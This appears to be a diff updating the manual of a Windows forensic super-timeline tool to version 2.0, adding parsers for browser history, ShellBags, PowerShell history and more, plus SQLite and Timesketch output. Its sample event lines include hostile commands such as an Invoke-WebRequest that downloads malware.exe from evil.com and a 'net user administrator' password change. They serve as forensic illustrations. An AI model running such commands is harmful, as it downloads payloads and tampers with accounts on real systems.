@@ -1,5 +1,5 @@
 # supertimeline — Forensic Super-Timeline Generator
-## Analyst Manual v1.0.0
+## Analyst Manual v2.0.0
 
 ---
 
@@ -17,6 +17,8 @@
 10. [Timesketch Integration](#10-timesketch-integration)
 11. [Troubleshooting](#11-troubleshooting)
 12. [Comparison with Plaso](#12-comparison-with-plaso)
+
+> **v2.0.0 — All phases complete.** New parsers: Amcache, $LogFile, ShellBags, Scheduled Tasks, Browser (Chrome/Edge/Firefox), Windows Timeline, Recycle Bin, WER, PowerShell history. New output formats: SQLite, Timesketch-native CSV. New schema columns: `hostname`, `message_short`, `file_path`. All output formats timestamp-sorted. Security hardened (safe temp files, no subprocess code injection).
 
 ---
 
@@ -48,12 +50,17 @@ supertimeline/
 ├── core/                   ← Rust library (compiled to .pyd / .so)
 │   └── src/
 │       ├── parsers/
-│       │   ├── mft.rs        ← $MFT parser    (rayon parallel, mmap)
-│       │   ├── usnjrnl.rs    ← $UsnJrnl:$J   (parallel 64MB chunks)
-│       │   ├── evtx.rs       ← EVTx logs      (parallel 64KB chunks)
-│       │   ├── prefetch.rs   ← .pf files      (parallel per-file)
+│       │   ├── mft.rs        ← $MFT parser       (rayon parallel, mmap)
+│       │   ├── usnjrnl.rs    ← $UsnJrnl:$J       (parallel 64MB chunks)
+│       │   ├── evtx.rs       ← EVTx logs          (parallel 64KB chunks)
+│       │   ├── prefetch.rs   ← .pf files          (parallel per-file)
 │       │   ├── lnk.rs        ← LNK Shell Link parser
-│       │   └── jumplists.rs  ← Jump List parser (CFB/OLE + DestList)
+│       │   ├── jumplists.rs  ← Jump List parser   (CFB/OLE + DestList)
+│       │   ├── shellbags.rs  ← ShellBag BagMRU parser
+│       │   ├── tasks.rs      ← Scheduled Tasks XML parser
+│       │   ├── recyclebin.rs ← $Recycle.Bin $I file parser
+│       │   ├── wer.rs        ← Windows Error Reporting .wer parser
+│       │   └── pshistory.rs  ← PowerShell ConsoleHost_history.txt
 │       ├── storage/
 │       │   └── arrow_writer.rs  ← Parquet streaming writer
 │       └── types.rs        ← TimelineEvent struct, FILETIME conversion
@@ -71,9 +78,11 @@ supertimeline/
 │       │   ├── logfile.py          ← $LogFile parser (pure Python)
 │       │   ├── prefetch.py         ← Prefetch glue: MAM decompress → Rust
 │       │   ├── lnk.py              ← LNK/JumpList glue: walk Recent/ → Rust
+│       │   ├── browser.py          ← Browser history: Chrome, Edge, Firefox (pure Python)
+│       │   ├── wintimeline.py      ← Windows Timeline ActivitiesCache.db (pure Python)
 │       │   └── usnjrnl_recover.py  ← USN journal carver (zeroed/unallocated)
 │       └── storage/
-│           └── writer.py   ← Streaming Parquet/JSONL/CSV writer
+│           └── writer.py   ← Streaming Parquet/JSONL/CSV/SQLite/Timesketch writer
 │
 └── MANUAL.md               ← This document
 ```
@@ -347,14 +356,15 @@ Usage: supertimeline [OPTIONS] ROOT_PATH
 
 Options:
   -o, --output TEXT         Output file path  [default: timeline.parquet]
-  -f, --format [parquet|jsonl|csv]
+  -f, --format [parquet|jsonl|csv|sqlite|timesketch]
                             Output format  [default: parquet]
   -w, --workers INTEGER     Worker threads (0 = auto = CPU count)  [default: 0]
-  --no-sort                 Skip final timestamp sort (faster, unsorted output)
+  --no-sort                 Skip timestamp sort
   --discover-only           List discovered artifacts without parsing
-  --summary / --no-summary  Print per-artifact summary on completion
+  --debug                   Show per-artifact breakdown after parsing
   --recover-usnjrnl         Carve zeroed $J streams for recovered USN records (fast)
   --recover-usnjrnl-deep    Carve entire image for USN records incl. unallocated (slow)
+  --verbose, -v             Show parser warnings and errors (enables logging)
   --help                    Show this message and exit.
 ```
 
@@ -370,8 +380,14 @@ supertimeline E:\ -o case001.parquet -w 16 --no-sort
 # JSONL for Timesketch direct ingest
 supertimeline E:\ -o case001.jsonl -f jsonl
 
-# CSV for spreadsheet analysis
+# CSV for spreadsheet analysis (sorted by timestamp)
 supertimeline E:\ -o case001.csv -f csv
+
+# SQLite for DB Browser or custom SQL queries
+supertimeline E:\ -o case001.db -f sqlite
+
+# Timesketch-native CSV (datetime/timestamp_desc/source_short/source_long columns)
+supertimeline E:\ -o case001_ts.csv -f timesketch
 
 # Discover artifacts only (no parsing)
 supertimeline E:\ --discover-only
@@ -743,11 +759,48 @@ supertimeline E:\ -f jsonl -o - | timesketch_importer --pipe
 
 ### 8.3 CSV
 
-Standard comma-separated values. Compatible with Excel, LibreOffice, grep.
+Standard comma-separated values. Compatible with Excel, LibreOffice, grep. Always sorted by timestamp.
 
 ```bash
 # Filter in PowerShell:
 Import-Csv timeline.csv | Where-Object { $_.source -eq "EVTX" } | Export-Csv evtx_only.csv
+```
+
+### 8.4 SQLite
+
+Single-file SQLite database with a `timeline` table. Automatically indexed on `timestamp_ns` and `artifact`. Load with DB Browser for SQLite, DBeaver, or any Python `sqlite3` query.
+
+```bash
+supertimeline E:\ -o case001.db -f sqlite
+```
+
+```python
+import sqlite3
+conn = sqlite3.connect("case001.db")
+rows = conn.execute(
+    "SELECT timestamp_iso, artifact, message FROM timeline "
+    "WHERE artifact = 'Windows Event Log' AND message LIKE '%4624%' LIMIT 100"
+).fetchall()
+```
+
+```sql
+-- Filter with DB Browser or DBeaver
+SELECT timestamp_iso, hostname, message
+FROM timeline
+WHERE artifact = 'Windows Event Log'
+  AND timestamp_iso > '2024-01-01'
+ORDER BY timestamp_ns;
+```
+
+### 8.5 Timesketch-native CSV
+
+Produces a CSV with the column names Timesketch expects: `datetime`, `timestamp_desc`, `source_short`, `source_long`, `message`, `message_short`, `hostname`, `filename`. Ready for direct import with `timesketch_importer`.
+
+```bash
+supertimeline E:\ -o case001_ts.csv -f timesketch
+timesketch_importer --host http://timesketch:5000 \
+  --username analyst --password secret \
+  --sketch_id 1 case001_ts.csv
 ```
 
 ### Output Schema
@@ -759,10 +812,149 @@ Import-Csv timeline.csv | Where-Object { $_.source -eq "EVTX" } | Export-Csv evt
 | `macb` | string | MACB flag: M, A, C, or B |
 | `source` | string | Parser source (`$MFT`, `EVTX`, `PREFETCH`, etc.) |
 | `artifact` | string | Artifact type (`$STANDARD_INFORMATION`, `Windows Event Log`, etc.) |
-| `artifact_path` | string | Full path to the source file |
-| `message` | string | Human-readable event description |
+| `hostname` | string | Computer name (from EVTX `<Computer>` field; filled for all events in post-processing) |
+| `file_path` | string | Source file or target path (LNK target, prefetch exe name, browser URL, etc.) |
+| `message` | string | Human-readable event description (full) |
+| `message_short` | string | Truncated to ≤80 chars — for compact timeline viewers |
 | `is_fn_timestamp` | bool | True if from `$FILE_NAME` (timestomp detection) |
 | `tz_offset_secs` | int32 | Source timezone offset (0 = UTC already normalized) |
+
+---
+
+### 7.9 Amcache Parser (`cli/supertimeline/parsers/amcache.py`)
+
+**What it parses:** `Windows\AppCompat\Programs\Amcache.hve` — a registry hive tracking program execution and installation history.
+
+**Timestamps extracted:** Last modified time of each Amcache entry (proxy for first execution time)
+
+**Keys parsed:**
+
+| Key | Contents |
+|---|---|
+| `Root\InventoryApplicationFile` | SHA-1 hash, file path, link date, publisher for every executed binary |
+| `Root\InventoryApplication` | Installed application name, version, install date, publisher |
+| `Root\InventoryDriverBinary` | Driver path, SHA-1, service name — useful for unsigned/rootkit driver detection |
+
+**Events generated:**
+- `Amcache: C:\Users\user\Downloads\malware.exe | SHA1: abc123...`
+- `Amcache Driver: C:\Windows\System32\drivers\evil.sys | unsigned`
+
+**Performance:** Pure Python via `python-registry`. Typical 2–10 MB hive → < 1 second.
+
+---
+
+### 7.10 $LogFile Parser (`cli/supertimeline/parsers/logfile.py`)
+
+**What it parses:** NTFS `$LogFile` — the journal of NTFS metadata operations. Captures file system transactions at the MFT level, including operations that were in-flight or recently committed.
+
+**Timestamps extracted:** 1 per redo log record (timestamp embedded in log entry)
+
+**What it captures:** File create, delete, rename, attribute update, and MFT extension operations recorded by the NTFS log. These operations predate USN journal entries and can reveal activity that was not flushed to `$UsnJrnl`.
+
+**Events generated:**
+- `LogFile: CREATE C:\Windows\Temp\suspicious.exe`
+- `LogFile: RENAME C:\oldname.exe → C:\newname.exe`
+
+**Performance:** Pure Python. Typical 64 MB $LogFile → ~5–15 seconds.
+
+> **Note:** $LogFile is only available when parsing from a forensic image — it is inaccessible on a live running Windows volume due to kernel locks.
+
+---
+
+### 7.11 Browser Parser (`cli/supertimeline/parsers/browser.py`)
+
+**What it parses:** Chrome, Edge (Chromium), and Firefox browser history and downloads
+
+**Browsers supported:**
+
+| Browser | History file | Timestamp origin |
+|---|---|---|
+| Google Chrome | `AppData\Local\Google\Chrome\User Data\*\History` | WebKit epoch (microseconds since 1601-01-01) |
+| Microsoft Edge | `AppData\Local\Microsoft\Edge\User Data\*\History` | WebKit epoch |
+| Mozilla Firefox | `AppData\Roaming\Mozilla\Firefox\Profiles\*\places.sqlite` | Unix epoch (microseconds) |
+
+**Events generated:**
+- `Browser Visit: https://example.com - "Page Title" [Chrome]`
+- `Browser Download: C:\Users\user\Downloads\file.exe from https://evil.com [Edge]`
+
+**Performance:** Pure Python via `sqlite3`. The browser DB is opened via a temp copy to avoid WAL lock conflicts.
+
+---
+
+### 7.12 Windows Timeline Parser (`cli/supertimeline/parsers/wintimeline.py`)
+
+**What it parses:** `AppData\Local\ConnectedDevicesPlatform\*\ActivitiesCache.db`
+
+Windows Timeline records app usage and document opens across devices.
+
+**Events generated:**
+- `Timeline: opened C:\Users\foo\report.docx in WINWORD.EXE`
+- `Timeline: used Microsoft Edge`
+
+**Performance:** Pure Python via `sqlite3`.
+
+---
+
+### 7.13 ShellBag Parser (`core/src/parsers/shellbags.rs`)
+
+**What it parses:** `HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU` from `UsrClass.dat`
+
+ShellBags record every folder ever browsed in Windows Explorer — including deleted folders, network shares, USB device paths, and ZIP file contents.
+
+**Events generated:**
+- `ShellBag: C:\Users\user\Desktop\Evidence (last explored)`
+- `ShellBag: \\SERVER\share (network path explored)`
+
+**Value to investigation:** Proves a user navigated to a specific directory even if the directory no longer exists. USB device and removable media paths are especially useful.
+
+---
+
+### 7.14 Scheduled Tasks Parser (`core/src/parsers/tasks.rs`)
+
+**What it parses:** XML task definition files from `Windows\System32\Tasks\**\*`
+
+**Events generated:**
+- `Task: \Microsoft\Windows\Foo | Action: cmd.exe /c malware.bat | Trigger: daily 03:00`
+
+Timestamps are extracted from the `<Date>` element in the task XML (task registration time).
+
+---
+
+### 7.15 Recycle Bin Parser (`core/src/parsers/recyclebin.rs`)
+
+**What it parses:** `$Recycle.Bin\S-1-5-...\$I*` files (Windows Vista+)
+
+Each `$I` file stores the original path, deletion timestamp, and original file size.
+
+**Events generated:**
+- `Deleted: C:\Users\user\Documents\secret.docx (1,234 bytes)`
+
+**Performance:** Rust, parallel per-file.
+
+---
+
+### 7.16 Windows Error Reporting Parser (`core/src/parsers/wer.rs`)
+
+**What it parses:** `*.wer` files from `AppData\Local\Microsoft\Windows\WER\ReportArchive\` and `ProgramData\Microsoft\Windows\WER\ReportArchive\`
+
+WER files are key-value text files recording application crashes — faulting module, exception code, app version, and crash time.
+
+**Events generated:**
+- `WER Crash: WINWORD.EXE (ver 16.0.x) faulting module ntdll.dll, code 0xC0000005`
+
+---
+
+### 7.17 PowerShell History Parser (`core/src/parsers/pshistory.rs`)
+
+**What it parses:** `AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
+
+Records every PowerShell command typed interactively. No per-command timestamps — the file modification time is used as the event timestamp.
+
+**Events generated:**
+- `PS History: Invoke-WebRequest http://evil.com -OutFile malware.exe`
+- `PS History: net user administrator P@ssw0rd`
+
+**Limitation:** Timestamps are all the same (file mtime) — useful for the commands themselves, not individual timing.
 
 ---
 
@@ -806,18 +998,24 @@ fn = df[df.artifact == "$FILE_NAME"].copy()
 
 ## 10. Timesketch Integration
 
-### Direct JSONL import
+### Native Timesketch CSV (recommended)
+
+Use `-f timesketch` to produce a CSV with exactly the columns Timesketch expects (`datetime`, `timestamp_desc`, `source_short`, `source_long`, `message`, `hostname`). This is the simplest path — no column remapping needed.
 
 ```bash
-# Generate JSONL
-supertimeline E:\ -f jsonl -o case001.jsonl
-
-# Import to Timesketch
+supertimeline E:\ -o case001_ts.csv -f timesketch
 timesketch_importer --host http://timesketch:5000 \
-  --username analyst \
-  --password secret \
-  --sketch_id 1 \
-  case001.jsonl
+  --username analyst --password secret \
+  --sketch_id 1 case001_ts.csv
+```
+
+### JSONL import
+
+```bash
+supertimeline E:\ -f jsonl -o case001.jsonl
+timesketch_importer --host http://timesketch:5000 \
+  --username analyst --password secret \
+  --sketch_id 1 case001.jsonl
 ```
 
 ### Parquet → Timesketch via pandas
@@ -826,8 +1024,7 @@ timesketch_importer --host http://timesketch:5000 \
 import pandas as pd
 from timesketch_import_client import importer
 
-df = pd.read_parquet("timeline_sorted.parquet")
-# Timesketch expects 'message', 'datetime', 'timestamp_desc'
+df = pd.read_parquet("case001.parquet")
 df["datetime"] = df["timestamp_iso"]
 df["timestamp_desc"] = df["macb"] + " " + df["artifact"]
 
@@ -903,28 +1100,36 @@ HDD sequential read speed (~150 MB/s) bottlenecks I/O-bound phases.
 |---|---|---|
 | $MFT parsing | ✅ | ✅ (8 timestamps/file, faster) |
 | $UsnJrnl | ✅ | ✅ |
-| EVTx | ✅ | ✅ |
-| Prefetch | ✅ | ✅ |
+| EVTx | ✅ | ✅ (with hostname, level, snippets) |
+| Prefetch | ✅ | ✅ (up to 8 run times per .pf) |
 | Registry | ✅ | ✅ |
 | SRUM | ✅ | ✅ |
 | Amcache | ✅ | ✅ |
 | PcaSvc (Win 11 22H2+) | ❌ | ✅ |
 | LNK / Jump Lists | ✅ | ✅ |
-| Browser history | ✅ | 🔜 v1.1 |
+| ShellBags | ✅ | ✅ |
+| Scheduled Tasks | ✅ | ✅ |
+| Browser history (Chrome/Edge/Firefox) | ✅ | ✅ |
+| Windows Timeline | ✅ | ✅ |
+| Recycle Bin | ✅ | ✅ |
+| Windows Error Reporting | ✅ | ✅ |
+| PowerShell history | ✅ | ✅ |
 | $LogFile | ✅ | ✅ |
 | macOS artifacts | ✅ | ❌ (Windows-focused) |
 | Linux artifacts | ✅ | ❌ (Windows-focused) |
-| Timesketch output | ✅ | ✅ (JSONL) |
+| Parquet output | ❌ | ✅ (~2.5x smaller than SQLite) |
+| SQLite output | ✅ | ✅ |
+| Timesketch output | ✅ | ✅ (native CSV + JSONL) |
 | Parallel parsing | ❌ | ✅ |
 | Streaming output | ❌ | ✅ |
-| Columnar storage | ❌ | ✅ (Parquet) |
+| Hostname in every event | Partial | ✅ (EVTX + post-process fill) |
 | Timestomp detection | Partial | ✅ (full $SI + $FN) |
 | 1TB wall clock time | 6–9 hours | **25–53 minutes** |
 
 ---
 
-*supertimeline v1.0.0 — Built for forensic analysts who cannot afford to wait.*
+*supertimeline v2.0.0 — Built for forensic analysts who cannot afford to wait.*
 
 ---
 
-*Parsers: $MFT · $UsnJrnl · EVTx · Prefetch · LNK / Jump Lists · Registry · SRUM · Amcache · PcaSvc · $LogFile*
+*Parsers: $MFT · $UsnJrnl · EVTx · Prefetch · LNK / Jump Lists · Registry · SRUM · Amcache · PcaSvc · ShellBags · Scheduled Tasks · Browser (Chrome/Edge/Firefox) · Windows Timeline · Recycle Bin · WER · PowerShell History · $LogFile*
